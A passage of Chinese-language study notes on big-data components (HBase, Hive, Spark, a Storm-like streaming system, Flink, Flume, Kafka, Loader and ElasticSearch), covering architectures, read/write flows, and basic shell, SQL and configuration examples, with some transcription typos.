：管理维护HRegionServer列表，管理分配Region, Region负载均衡\n- HRegionServer：管理分配给它的Region，处理用户的读写请求\n- DFS Client: HBase连接到HDFS的接口\n\n一个HRegionserver中包含一个HLog， 多个HRegion\n\n- HLog:预写式日志WAL,记录数据操作(数据写入之前必须先写入HLog)\n- Region:`分布式存储的最基本单位，刚开始一个Region存储一个表的内容随着数据增多`，Region会不断分裂\\\nStore:一个Region中包含多个Store,`一个Store存储一个列族数据`\\\nMemStore (写缓存):一个Store包含一个MemStore \\\nStoreFile (磁盘文件):一个Store中包含多个StoreFile\\\nHFile (HDFS文件): 一个StoreFile添加头部信息转换成HFile,最终存储在HDFS中\n\n\n- 数据写入关键流程:先写入HLog,然后才能写入MemStore,当MemStore达到溢出要求(128M) ,将数据刷写StoreFile中\n- 数据读取关键流程:先读取MemStore,如果没有,再读取BlockCache (读缓存)，如果还是没有最终才读取StoreFile\\\n  BlockCache存储之前的用户查询过的数据，当MemStore和BlockCache中都没有数据， 需要从StoreFile\\\n  中读取数据时，读取完的数据会被加载到BlockCache中\n\n## Region拆分\n- 拆分原因:数据不断增加，region不断增大， region过大会影响数据读写速度\n- 拆分条件:根据行键拆分，尽可能将同一个行键或相似的行键放在一个Region中\n-region拆分过程很快，接近瞬间,在拆分时实际还是请求的原文件,拆分结束之后会将原文件内容异步写入新文件,然后之后的请求被转移到新文件\n\n## Region定位 \n  元数据信息存储在hbase:meta中,这个表信息被存储在zookeeper内存中通过元数据信息获取Region实际存储位置\n\n\n## HRegionServerBR\nH RegionServer出现故障时\n1. zookeeper发现RegionServer故障，同时HMaster\n2. HMaster获取故障的RegionServer上的HLog信息，根据与Region的对应关系对HLog进行拆分\n3. 把HLog存放在Region目录下，把Region重新迁移至其他的RegionServer上\n4. 其他的RegionServer接收到Region执行重新执行HLog内容\n\n## HLog的工作原理\n- HLog: WAL预写式日志，数据更新的操作都要先写入HLog中，才能写入MemStore\\\n`当MemStore被刷写到磁盘后，会向HLog中写入一条标记记录 (标记记录之前的所有数据都已经刷写到磁盘)`\n- 系统启动时，系统任务先扫描HLog, 检测是否有数据没有写入到磁盘中,如果有先执行写入MemStore,然后再刷写到磁盘，清空缓存,最后再为用户提供服务 \\\n  如果数据丢失，可以根据HLog重新执行恢复\n- 一个RegionServer只有一-个HLog (共用一个HLog)\\\n    优点:写入日志时不需要查找对应的Log,直接全部写入一个HLog\\\n    缺点:如果RegionServer出现故障， 需要对HLog进行拆分\n\n## 缓存刷写(把MemStore数据写入到StoreFile中)\n- 当MemStore达到刷写条件，就会将内容刷写到StoreFile文件中\n- 缓存的刷写是针对整个Region的，当一个MemStore达到刷写要求， 当前的Region下面的所有MemStore都会触发刷写\n- 每次刷写都会生成一个新的StoreFile文件(每次的刷写内容都分别在一个新文件中)\n- 刷写完成之后会在HLog中写入标记记录,并且清空缓存\n\n## StoreFile的合并\n    (刷写操作会出现大量的StoreFile,且部分StoreFile文件大小过小) 合并比较消耗资源,达到一定阈值才会执行\n    将多个的StoreFile小文件合并成一个大文件,如果StoreFile文件过大，再进行拆分(根据HDFS块进行拆分)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151417167.png?token=ARYCSARKZXKFELTQTTNKS2LCQCNSG)\n\n合并文件会进行筛选:如果本身的StoreFile就已经达到1 00M左右,这个StoreFile是不参与合并的\n\n## HBase读取流程\n1. Client请求zookeeper获取hbase:meta表元数据信息，获取RegionServer信息\n2. Client请求相对应的RegionServer\n3. RegionServer接收到请求反馈数据给Client\n4. 关闭读取流\n\n## HBase写入流程\n1. Client请求的zookeeper,获取hbase:meta表信息,根据写入的行键获取对应的RegionServer信息\n2. Client请求RegionServer发起写入请求\n3. RegionServer接收到请求后将数据写入到行键对应的Region中.\n4. RegionServer反馈写入状态给Client\n5. 关闭写入流\n\n## BloomFilter (布隆过滤器)\n    判断数据是否存在，如果反馈结果为不存在，是可信的，如果反馈结果为存在，可能有误差\n\n缩小数据违取范围\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151417006.png?token=ARYCSAWFZISPZYGSH4D2ZW3CQCNTA)\n\n在HBase中行键是以字典序进行排序\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151417994.png?token=ARYCSASMGZRH33VA4OG27TLCQCNTW)\n\n\n## HBase Shell命令\n```sql\nnamespace:\n    create_namespace '名称'\n    list_namespace\n    list_namespace_ tables 'ns1'\n    alter_namespace 'ns1 ,{属性名称=> '属性值}\n    drop_ namespace 'ns1' ---命名空间需要是空的\n\nddl:数据定义语言---> 表层面的操作\n    create '表名',列族名1';列族2'\n    create '表名,{NAME= > '列族' VERSIONS= > 5},{NAME= >列族' ,VERSIONS= >5}\n    修改列族属性信息、添加列族: alter '表名',{NAME=> '列族' ,VERSIONS=>5}-->如果列族存在做修改，不存在做添加\n    使用list可以查看所有的表:包含default命名空间和自定义命名空间中的表\n    查看表信息: describe '表名'\n    删除表: drop '表名’--> 禁用状态的表才 能进行删除\n    禁用表: disable 表名' /启用表: enable '表名'\n    \ndml:数据管理语言--> 针对数据层面的操作\n    添加数据: put '表名，’行键\",列族:列\",值’--> 默认使用的是系统时间戳\n    删除数据: delete '表名\";行键’\n    delete表名',行键\"，列族:列'\n    delete表名';行键\",列族列,{TIMESTEMP= >'235652'}\n    清空表: truncate '表名'\n    数据获取: get '表名';行键’\n    get '表名'行键\";列族列\n    get '表名'，'行键\";列族列,{VERSIONS=>3}\n    数据扫描: scan '表名'\n    scan '表名\"';行键';列族列,VERSIONS= >3}\n\nsnapshot:快照操作--> 针对表创建快照，记录当前指定表的数据信息\n    创建快照: snapshot '表名\"，'快照名称'\n    还原快照: resotre_ snapshot '快照名'\n    克隆快照: clone_ snapshot ‘快照名;新表名' --->把快照中的表内容还原到一-张新表上\n    删除快照: delete snapshot '快照名'\n```\n\n\n# Hive\n    数据仓库，查询分析\n\n\n## Hadoop生态圈\n- HDFS存储、 HBase存储提供实时读写功能\n- MapReduce并行计算、Yarn资源管理和任务调度\n- ZooKeeper协助分布式应用管理服务\n- Hive底层使用的是MapReduce做计算，MapReduce的使用对编程人员要求比较高\n- 可以执行SQL类的查询分析计算\n\n## Hive数据模型\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151417757.png?token=ARYCSAX53FFMS4HLAGAULR3CQCNU4)\n\n- 分区:根据字段值进行划分(指定分区字段,分区字段值相同的记录就存放在一一个分区中)\\\n分区在物理上是一个文件夹\\\n分区下还可以再有分区和桶\\\n在创建表的时候可以指定分区字段\\\n分区数量是不固定的\n  \n- 桶:根据值的哈希值进行求余放到对应的桶中\\\n桶在物理.上是一-个文件\\\n在创建表的时候可以指定有几个桶\n  \n- 表类型:托管表(内部表)、外部表、临时表\\\n托管表(internal) :元数据和数据信息都是Hive在管理\\\n`删除时，元数据和数据都会被删除\\`\n外部表(external) :元数据由Hive管理,但是数据可以提供给其他组件共享\\\n`删除时，只删除元数据，数据信息依旧保留\\`\n临时表(temporary) :只在当前会话中生效，当会话结束表就会被自动删除\n\n## Hive数据仓库分层`(逻辑分层)`\n- ODS (原数据层，操作数据层) :从数据源获取到的数据\n- DWD (数据明细层) :根据ODS做数据清洗得到的结果\n- DWS (数据服务层) :根据DWD进行汇总分析计算\n- ADS (应用服务层) :根据上层应用的业务需求将DWS数据再一次处理分析得到业务 需要的数据\n\n## Hive的分层处理的优势\n- 复杂问题简单化:将复杂问题分成多个流程，每个层面执行一-一个流程内容\n- 减少重复开发:不要每次提供给上次应用数据时都要对数据进行清洗汇总操作\n- 隔离原始数据:减少到原数据的依赖，避免因为原数据的原因，导致后续操作无法执行\n\n\n## Hive SQL的使用\n```sql\nDDL:数据定义语言\n    创建表: create table '表名(字段类型,字段2类类型... .);\n    create external table表名'(字段类型,字段2类型....\n    create temporary table '表名'(字段类型,字段2类型... .\n    修改表: alter table表名' rename to '新表名;\n    alter table '表名' addcolumns (字段类型);\n    删除表: drop table '表名';\n    查询数据库中的所有表: show tables;\n    查看表信息: describe table '表名';\n    \nDML:数据管理语言\n    添加数据:从文件中添加到表中\n    load data inpath HDFS路径into table表名\n    load data local inpath Linux路径into table表名\n    load data local inpath Linux路径overwrite into table表\n    \n    从一个表添加到另-一个表中\n    insert into table 表名 select * from 原表 where条件;\n    from 原表 insert into table 表名 select * where 条件\n    from 原表 insert overwrite table 表名 select 字段 where 条件\n    从表中导出到文件中\n    insert into directory HDFS路径 select * from表\n    insert into local directory Linux 路径select * from 表\n    export table 表 to HDFS路径\n    \nDQL:数据查询语言\n    标准查询: select * from表名\n    分组: select * from 表名 group by字段\n    排序: select * from 表名 order by字段desc\n    多表联合查询: select * from (select * from 表 a join 表b  on a.id= b.id)\n    \n创建表时的特殊操作\n    分区: partitioned (字段类型)\n    指定列分隔符: row format delimited fields terminated by '分隔符'\n    指定外部表的存储路径: location 路径\n    指定外部表的存储类型: stored as textfile\n    指定字段加密: ROW FORMAT SERDE\n    'org.apache.hadoop.hive.serde2.lazy.LazySimpleSerDe' WITH SERDEPROPERTIES(\n    'column.encode.columns'='字段1,字段\n    2'column.encode.classname' ='org apache.hadoop.hive.serde2.AESRewriter);\n```\n\n# Spark\n\n## Spark特点\n    轻快灵巧Spark的处理能力是MapReduce的30倍，处理能力不容易受到任务量增加的影响\n轻:底层代码只有3万行，使用的函数式编程语言scala\n快:处理速度快\n灵:提供很多不同层面的处理功能\n巧:巧妙的应用Hadoop平台\n\n\n## RDD:分布式数据集、可分区的\n- 具有血统机制(RDD由父RDD执行操作之后产生)\n- 如果子RDD丢失，RDD故障，重新执行父RDD就可以重新得到的子RDD\n- RDD默认存储在内存中，如果内存不足的时候，发生溢写\n- Spark节点会分配60%的内存用于做缓存，40%执行内存\n\n\n## 依赖类型\n    宽依赖、窄依赖\n- 窄依赖:父RDD的每个分区都只会被`一个`子RDD的分区所依赖\n- 宽依赖:父RDD的每个分区可能会被`多个子RDD的分区所依赖`\n\n## Stage划分\n    遇到窄依赖就加入，宽依赖就断开，剩余的所有RDD被放在一个Stage中\n\n## RDD操作类型\n- 创建操作:创建RDD用于接收数据结果\n- 原始RDD:读取数据源获得的RDD (readFile(path))\n- 转换得来:通过父RDD执行操作后得到的子RDD\n- 控制操作:持久化RDD,可以持久化到内存或磁盘中,默认存在内存\n- 转换操作:可对RDD执行的处理操作，转换操作是懒惰的，转换操作并不是立马执行，遇到行动操作才执行\n- 行动操作:实际调用Spark执行(存储文件,数据输出等)\n\n\n- transformation算子在整个程序中 ->声明转换操作,实际并没有执行\n- action算子时， 会从第一-个操作开始执行\n- DataFrame:属于一个DataSet实例， 不可变的弹性分布式数据集，存储数据时不止存储数据内容,存储数据对应结构信息及类型\n- DataSet:以对象的形式存储数据集，DataFrame= DataSet[Row]\n\n## RDD、DataFrame、 DataSet数据集的联系\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151418011.png?token=ARYCSAWRARIHVOCZT6NHLH3CQCNVU)\n\n\n## Spark体系架构\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151418466.png?token=ARYCSAQGUHHKT3TZXELJC7LCQCNWU)\n\n- 集群部署形式: \\\n  Standalone: spark自 己管理资源调度\\\n  Spark On Yarn:使用yarn做资源管理调度 \\\n  Mesos: AMR实验室开发的资源管理器，最适用于Spark的资源管理器\n- Spark Core:处理核心\n- Spark SQL:处理结构化数据，使用Hive元数据\n- Spark Streaming:实时流处理(实际微批处理) , 能够低延迟的计算反馈结果\n- MLLib:机器学习,根据历史数据进行建模，根据模型和提供的数据进行数据预测\n- GraphX:图计算,主要用于关系统计,关系查询\n- SparkR: R语言库,提供R语言接口，可以使用R语言操作Spark\n- Structured Streaming:流处理，将数据存入-个无边界表(新数据不断添加，旧数据不断移除)使用增量的方式获取表数据内容进行执行\n\n\n# Streaming\n    分布式流处理组件\n\n## 关键特性:实时响应，延迟性低\n- 数据不存储先执行(离线处理先存储数据然后再执行)\n- 连续查询(程序运行后就不终止,除非系统故障导致的终止或者手动停止)\n- 事件驱动:传入的数据信息触动任务处理\n\n\n## Streaming系统架构\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151418540.png?token=ARYCSAXAP6TJ6NCOI5DFBPDCQCNXE)\n\n- Client:客户端接口\n- Nimbus (主节点) :接收客户端的请求，管理Supervisor从节点，管理任务分配，编写任务书\n- Supervisor (从节点) :实行任务，管理worker\n- Worker (进程) :程序执行\n- Executor (线程) :每个Executor中默认执行一 一个Task\n- Task (任务) : Task分别对应每一 个Spout/Bolt组件的执行 \n- ZooKeeper:监控Nimbus主节点的状态，如果主节点故障切换备用节点\\\n监控Supervisor从节点状态，如果从节点故障,通知Nimbus迁移任务，启动自动恢复\\\n接收Nimbus任务书，将每个从节点的任务存放在每个Supervisor自己对应的目录中\n\n\n## Streaming任务架构\n- Topology:拓扑结构,封装任务执行流程\n- Spout:发送数据源的组件,接收第三方数据收集I具提供的数据发送到数据流\n- 每个应用只有一个spout\n- Bolt:从数据流中获取数据,执行数据处理，如果当前bolt不是最后-个执行程序将结果放回数据流一个应用中可以有多个bolt\n- Tuple:数据流中的数据格式，组件之间数据传输的格式，元组中包含两个参数(id, stream)\n\n## Streaming执行任务\n1. 用户通过Client提交应用到Nimbus中\n2. Nimbus接收到应用后，根据应用情况及当前集群的从节点情况编写任务书\n3. 将任务书.上传到ZooKeeper中\n4. ZooKeeper接收到任务书后根据每个节点将对应的任务存放在节点对应的目录下\n5. Supervisor周期性监测自己在ZooKeeper中的目录有没有新任务\n6. Supervisor发现新任务，根据任务书内容从Nimbus中下载任务所需要的jar包\n7. Supervisor执行任务,反馈执行状态给Nimbus .\n8. Nimbus将任务状态反馈给Client\n\n\n## 根据任务架构执行\n1. 获取拓扑结构\n2. 根据拓扑结构分别找到每一流程的处理单元\n3. 按照路程执行处理单元\n\n## 消息传递语义\n- 最多一次:数据发送只发送一次, 可靠性最低，吞吐量最大\\\n    缺点:可能存在数据丢失的情况\\\n    优点:数据一定不会被重复执行\n- 最少一次:数据可能会发送多次，可靠性高，吞吐量较小\\\n    优点:数据不会丢失\\\n    缺点:数据可能会被重复执行\n- 仅有一次(精准一次) :数据就发送一-次, 并且保证发送成功，可靠性高，吞吐量最低\\\n    优点:数据不会丢失，且数据不被重复处理\\\n    缺点:消耗的资源和时间较多\n\n## Ack机制(消息传输最少一次)\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151418753.png?token=ARYCSAWRFRIHBUCJJK33MJLCQCNXY)\n\n\n\n# Flink\n    分布式实时计算引擎(流处理引擎)\n\n\n## Flink VS Spark Streaming\n- Flink可以做流处理(侧重)也可以做批处理，底层引擎属于流处理引擎\n- 通过流处理引擎模拟批处理形式实现的批处理\n- Spark可以做流处理也可以做批处理(侧重点)，底层弓|擎属于批处理引擎\n- 通过批处理引擎,模拟流处理实现的流处理功能\n\n## Flink的关键特性\n    状态、时间、窗口、检查点\n\n\n## Flink系统架构\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151418648.png?token=ARYCSAX4VBWVPDPE5COHNI3CQCNY4)\n\n- 部署形式: Local (单机版部署)\\\n    Cluster (Standalone: Flink集群自己管理资源调度\\\n    Yarn:借助Yarn组件帮助管理协调资源和任务)\\\n    Clound (云部署)\n- Flink核心模块: Runtime (不管是流处理还是批处理都是在Runtime中执行)\n- 接口层: DataStream (流处理)和DataSet (批处理)\n- Table API & SQL:处理结构化数据\n```sql\nTable API:将操作应用封装成方法\n    select(\"t_ demo \").where(\"条件\")\n    \nSQL:基于Table API使用，\n    sqlQuery(\"select * from t_ demo where条件\")\n```\n\n## 有界流和无界流\n- 有界流:知道开始，知道结束，使用批处理处理有界流数据.\n- 无界流:知道开始，不知道结束，使用流处理接口进行数据处理\n\n## DataStream:用于存储数据的数据集，只能执行流处理操作\n- 基于流处理运行环境获取到的数据\n\n## DataSet:用来接收数据的数据集，只能执行批处理操作\n- 基于批处理运行环境获取到的数据\n\n`并不能在一个应用中同时接收流处理和批处理接口，以此实现流处理和批处理的共用`\n\n\n## Flink运行流程\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151419908.png?token=ARYCSARE4QYFZKKQ3RJCOTLCQCN2A)\n\n1. DataSource:接收数据输入，从数据源获取数据\n2. Transformations:数据转换，数据处理过程\n3. DataSink:将最终数据结果输出到指定位置(如HDFS、 HBase、 文件、数据库等)\n\n## Flink程序运行流程\n`1. 创建运行环境流处理/批处理`\n2. 通过运行环境对象获取数据源数据(DataStream/DataSet)\n3. 针对数据集进行数据转换\n4. 将最终结果进行输出(批处理的print算子)\n`5. 最后执行程序(行动算子) executor()`\n\n## Flink运行程序\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151420112.png?token=ARYCSARQSJHF2WMKPMIWLCTCQCN6E)\n\n1. Client向JobManager发起请求\n2. Client对任务进行优化等操作\n3. JobManager分配任务给TaskManager\n4. TaskManager接收到任务后执行任务\n5. TaskManager反馈任务执行状态给JobManager\n6. JobManager统一反馈给用户\n\n- Flink Client:用户通过Client连接到JobManager\n- JobManager (主节点) :接收用户请求，管理资源任务分配，管理从节点信息\n- TaskManager (从节点) :接收任务处理任务，反馈给主节点\n- Standalone部署:创建Task Slot: Flink的抽象资源\n\n## Flink状态\n    区别于其他组件的一-个特性，支持状态管理(中间结果状态)\n\n## Fink窗口类型\n- 滑动窗口: 窗口移动方式是平移,设定参数时需要设定窗口大小,滑动距离.窗口大小固定,可能会出现数据源重复和数据丢失的情况\n- 滚动窗口: 窗口移动方式滚动,滚动距离就是窗口大小,设定窗口时只需要设定窗口大小.窗口大小固定,不会出现数据重复或者数据丢失的情况,会出现空窗口的情况\n- 会话窗口: 由会话启动的窗口,设定过期时间,窗口代销不固定,运行时不会有丢失的数据,不会出现空窗口\n- 时间窗口: 以时间为条件设定的窗口,`分别可以再分为滑动或滚动`\n- 数量窗口: 由会话启动的窗口,设定过期时间,`分别可以再分为滑动或滚动`\n\n## Fink的时间类型\n- 时间类型: 事件发生的时间 \n- 时间类型: 时间达到处理系统的时间\n- 处理时间(默认): 时间被处理的时间\n- 时间乱序问题: 事件被处理的顺序不是时间产生顺序\n- 时间乱序原因: 数据受到数据传输影响\n\n\n## Watermark(水位线/水印): 解决数据乱序问题\n- 设定水位线时间,当水位线设定的时间时间也达到系统时,就会触发窗口执行\n- 可设置水位线延迟,可允许窗口延迟触发\\\n\n\n\n\n## 对于延迟数据的处理方式\n- 丢弃(默认): 当窗口已经被触发过,该窗口的数据达到也会被丢弃,不会被执行\n- 可允许延迟: 设定可允许延迟时间,窗口已经被执行,但是输在可允许延迟时间达到,重新重发窗口的执行\\\n  `allowedLateness`(可延迟时间)\n- 收集后做统一处理: 把所有的延迟数据收集起来,在程序最后做统一处理\\\n`OutputTag<T> lateOutputTag = new OutputTag //用于存放延迟数据的数据集`\\\n`.side0utputLateData(late0utputTag)`\n\n## Flink容错性 (CheckPoint实现)\n1. `CheckPoint:检查点，自动触发,当任务结束后会自动删除`\n    - 保存当前任务状态，周期性触发,默认情况下不启动检查点\n    - 在启动检查点时就可以设定周期时间，单位ms: .enableCheckPointing(10000)\n    - 修改消息传输语义(默认情况仅有一次): .setCheckPointMode(CheckPointMode.AT_LEAST_ONCE)\n    - 快照超时时间:防止一个问题快照影响大量快照创建堆积: .setCheckpointingTimeout(60000)\n    - 可以设定检查点之间的最小间隔时间\n    - 可以设定最大并行执行数量\n    - 设定外部检查点:可以把检查点信息存储于在外部系统中，不会因为Flink系统问题受到影响\n2. SavePoint:保存点，底层CheckPoint, 手动触发,任务结束后也依旧保留\n\n## 状态保存\n内存:默认，state和checkpoint都存储在内存，只是用本地测试\n文件系统: state在内存， checkpoint在文件系统中\n数据库: state存储在内置数据库中，checkpoint在文件系统中，针对大量数据任务处理的场景\n\n# Flume\n    Flume属于一个高性能、分布式的海量日志采集工具可以适用于流数据采集、也可以用于静态数据采集\n\n## Flume基础架构\n    (主用应用于单节点数据采集)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151420684.png?token=ARYCSAQ53KMGFJWE4NRDOKDCQCN6Y)\n\n- Flume中有两个组件对外交互: source、 sink\n- source:采集数据,接收数据输入\n- channel:管道、 临时存储\n- sink:数据输出\n\n## Flume多agent架构\n    (主要用于集群外采集传递到集群内采集)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151420961.png?token=ARYCSAULGDFE5WKWJBQV4WTCQCN7I)\n\n- 把第一级的Flume数据输出到第二级Flume中\n- 设定第一-级Flume的sink类型为avro协议或者thrift协议可以将数据存储到下一级Flume的Source\n\n## Flume多Agent合并 \n    (将多数据源采集到的数据汇总处理)\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151420077.png?token=ARYCSAXS56IVNM2IIBLZWVDCQCOAC)\n\n## Flume数据传输基本单位\n- event: 基本单位,header+ byte[]\n- 当source采集数据时，在source内部将数据封装成event\n\n## Flume Agent原理\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151421543.png?token=ARYCSATG3JJOAWTBCBKGDG3CQCOAY)\n\n1. 在source内部可以将数据封装成event\n2. source将event传输给channel处理器(拦截器)可以做数据简单处理\n3. 清洗完后的数据通过channe|选择器将event输入到指定的channel\n4. SinkRunner在程序运行时就启动\n5. 使用sink处理器实例化一个指定类型的sink从指定的channel中抽取数据\n6. 将抽取到的数据按照设定的类型和目的路径将数据输出\n\n## Flume Source \n    (数据收集、接收数据输入)\n- 驱动型:被动接收数据输入\n- 轮询型:周期性的主动扫描是否有新数据产生\n\n## Flume Channel \n    (数据存储)\n- MemoryChannel (内存) : event数据存放在当前节点的内存中\\\n    读写速度快，数据未持久化，占用内存空间\\\n    capacity:最大内存容量(默认情况下使用到节点内存存满为止)\n  \n- FileChannel (文件) :使用WAL,管理上比较复杂\\\n数据可持久化，数据读写速度慢于内存形式\n  \n- JDBCChannel (内置数据库) : derby数据库，可以替代File存储的形式\\\n数据可持久化，数据读写速度慢于内存形式\n  \n## Flume Sink \n    (数据输出)\n\n## Flume的Source、Channel、 Sink之间的关系\n- `一个Source至少连接一个Channel`\n- `一个Sink只作用于一个Channel`\n\n## Flume级联节点\n    级联节点间传输的数据可以进行加密、压缩\n- 加密:提高数据传输安全性\n- 压缩:提高整体传输速度(减少传输时间)\n- `Flume内部数据传输(source --> channel --> sink) 不需要加密`\n\n## Flume运行实例\n    内容需要配置到配置文件中(自定义.properties)\n```bash\na.sources= r1\na.channels=c1\na.sinks=k1\na.sourses.r1.type=taildir\na.sourses.r1.postion= 记录pos记录的文件\na.sourses.r1.filegroups=f1 f2\na.sourses.r1.filegroups.f1 = 要监控的文件\na.sourses.r1.filegroups.f2= 要监控的文件\na.channels.c1.type=memory\na.sinks.k1.type=logger\na.sources.r1.channels=c1\na.sinks.k1.channel=c1\n```\n\n## Flume运行命令\n```bash\nflume-ng agent --name a --conf flumecï 71411Z --conf-file 配置文件 - Dflume.root.logger=info, console\nflume-ng agent -n a -C flume配置文件路径 -f 配置文件 -Dflume.root.logger=info, console\n```\n\n# Kafka\n    分布式日志系统(发布订阅消息系统)，可分区、多副本、多订阅\n\n## 消息传输形式\n- 点对点:数据在被获取到之后就会被从消息系统中删除(只有-一个用户可以获取到这个消息)\n- 发布订阅:消息发布之后，就算被用户获取之后也不会删除，依旧保留在系统中提供给其他用户获取\n\n## Kafka的特点\n- 可支持TB级别的数据也能在常量时间内的访问性能\n- 高吞吐率:单节点每秒可以传输100K条数据\n- 可分区:数据以分区形式存储\n- 多副本:提高数据容错性\n- 同时支持流处理和批处理\n- 可扩展性:本身属于集群由多节点组成，扩展节点\n\n## Kafka拓扑结构\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151421126.png?token=ARYCSAWNQND46BLECQTNASDCQCOBU)\n\n- Kafka:由broker集群组成\n- Producer:数据发布者，发布消息，将数据发布到Kafka中存储\n- Consumer:数据消费者，订阅消息，从Kafka中获取数据\n- ZooKeeper: Kafka强依赖，监测集群状态\n\n## Kafka集群系统架构\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151422239.png?token=ARYCSATAJWDNKTIBO7OTGSLCQCOFA)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151422226.png?token=ARYCSASRM7AGQUEACQZWSCDCQCOFS)\n\n## 消费组:consumer group\n    每个消费者一定是属于某一个消费组\n- 消费数据规则:消费组内的数据是竞争的,消费组间的数据是共享的 \\\n  一条消息可以被多个消费组获取,但是每个消费组只能有一个消费者消费信息\n- Kafka Topic:消息类别名\\\n用于区分记录数据、发布者发布数据时需要指定topic,消费者订阅数据时指定topic\n- Kafka Partition:分区，数据写入:顺序追加的方式\\\n数据以分区的形式存储，在创建topic时可以指定当前topic中有几个分区\n- Kafka Segment:分段\\\n每个消息就是一个分段, 分段由两个文件组成.index和.log\n- Offset:偏移量值\\\n每一个消息都有的唯一标识位置\n- 每个消费组都会维护一份offset文件(当前组中的成员读取的数据位置)\n- 读取数据时数据定位: broker --> topic --> offset\n\n## Kafka的其他重要概念\n- replica:副本，在创建partition的时候指定该分区有几个副本\\\n--partitons 1 --replaction-factor 2\\\n数据文件为2份，partiton本身也属于副本的一部分\n- leader:从副本中选取一个leader对外提供服务，发布者和消息者只跟leader交互\n- follower:除leader以外的其他副本都是follower, follower同步leader信息\n- controller: kafka中的一 -个服务器: leader选举、 leader切换\n- ISR列表:列表中的follower,能正常同步leader信息\\\n只有在列表中的follower有资格成为下一-任leader\\\n刚开始所有的follower都在ISR列表中，当follower故障不能及 时同步leader时会被移除列表\n  \n## Kafka分区副本\n    (节点和节点之间的分区互为主备)\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151422335.png?token=ARYCSAWMSBMNJRP2FG4WMY3CQCOGE)\n\n分区副本同步\n\n    (follower从leader同步数据 )\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151422218.png?token=ARYCSAXBVFDRGL4Q2FLNJC3CQCOG2)\n\n- 如果所有分区都出现故障\\\n可靠性高、恢复速度慢:等待ISR中的分区恢复，第一个恢复就是leader\\\n可靠性低、恢复速度快:等待分区恢复，第一个恢复的不管是不是ISR列表中的分区也成为leader\n- 可靠性传输:幂等性(操作一次和多次的结果是一样)\\\n给每条消息一个唯-标识id, 消息传递后使用一个列表记录已传输成功的消息id\\\n每条消息传输到达时都会被使用id在列表中查询，查看id是否存在\\\n如果存在:说明消息之前已经被传输过\\\n如果不存在:正常处理，并且处理完后将id写入列表\n- acks机制(检测数据是否发送成功)\\\nacks=0:不管数据是否发送成功\\\nacks=1:当数据写入leader时就认为成功\\\nacks=all:当数据写入leader并且follower都接收到才反馈成功\n- Kafka持久化存储数据(不管数据有没有被消费过)\n- 旧数据的处理方式:删除/压缩\\\n删除:配置数据过期时间\\\n压缩:根据键值对的key值只保留最新的value值，以前的值就删除\n- Kafka高吞吐的原因\\\n顺序读写:数据以追加形式写入分区，速度远快于随机读写\\\n零拷贝:数据写入不需要经过数据缓冲区直接到达磁盘\\\n分区:数据可以分别存在多个分区中，读取的时候可以并行的从分区中读取到数据\\\n压缩:可以对数据进行压缩\n  \n`分区副本:只有leader对外提供服务的, follower只做同步操作`\n\n# Loader\n    基于开源的Sqoop组件开发得到的\n\n## Loader\n- Loader数据导入导出(作用在关系型数据库和非关系型数据库之间)\\\n关系型数据库:结构化\\\n非关系型数据库:非结构化\n- 数据导入:数据从RDB导入到NoSQL\n- 数据导出:数据从NoSQL导出到RDB\n- Loader相比较Sqoop组件的增强特性\\\n图形化:提供WebUI界面可以通过界面配置任务,连接器的配置`MRS (Hue)`\\\n高性能:底层使用MapReduce并行处理\\\n高可靠:主备双机的搭建\\\n    作业失败后允许重试\n    作业失败后不会有残留的数据\n安全性:使用kerberos进行安全认证\n  \n## Loader模型架构\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151422011.png?token=ARYCSAS7ZWGY6RPEGOYEUMTCQCOHI)\n\n1. Loader Client: Tool: 命令行模式连接Loader服务\n    - Web UI: MRS图形化的方式连接到Loader\n    \n2. Loader Server:\n    - Restful API (http+json) 对外提供的连接接口\n    - JobSheduler: Transform 转换模块-->数据处理.\\\n    Execution执行模块-->执行计划\\\n    Submission提交模块-->提交到MR\\\n    JobManager:管理任务执行状态\n    - Metadata Repository:元数据仓库，存储管理元数据\n    - HA Manager:主备管理\n    \n\n## Loader任务执行\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151422876.png?token=ARYCSASCAA6THGM7VECBPZDCQCOH2)\n\n1. Client提交任务\n2. Loader任务计划\n3. 将任务提交给Yarn\n4. Yarn调配资源将任务分配为Map或Reduce任务执行\n5. 将数据存入设定的存储介质中\n\n## Loader任务配置\n- 输入:数据来源的配置\n- 转换:字段映射、获取数据、过滤数据、并发执行数量\n- 输出:数据最终输出目的地的配置\n\n# ElasticSearch\n    分布式检索服务,适用实时场景\n    Hive:可以做查询分析，底层MR处理，不适用实时\n\n## ElasticSearch特点\n- 基于Lucena扩展\n- 可以水平扩展\n- 原型环境和生产环境可以无缝切换\n- `作为非关系型数据库NoSQL数据库使用`\n- 支持结构化数据和非结构化数据\n\n\n## 索引\n1. 正排索引:在文件中查找关键字 \\\n    扫描每个文件内容找到跟关键字相关的文件，返回文件 \n   \n\n2.  倒排索引:根据关键字查找文件(提前给文件设定关键字)\\\n    根据关键字查哪些文件标记了这个关键字\\\n    快速查找相关文件，并且文件相关度更高 \n    \n\n## ElasticSearch系统架构\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151423023.png?token=ARYCSAUFEFGFKRZGMEMZQSTCQCOI6)\n\n- Client:连接到ZooKeeper获取集群信息，连接到集群\n- EsMaster:主要任务分配，管理EsNode信息， 不参与分片级别的数据检索\n- EsNode:处理用户管理索引|操作，管理自身分片信息(数据默认存储在内存中)\n- ZooKeeper: es强依赖，管理集群状态，并且记录集群信息\n\n## ElasticSearch中的核心概念\n- 索引: index --> 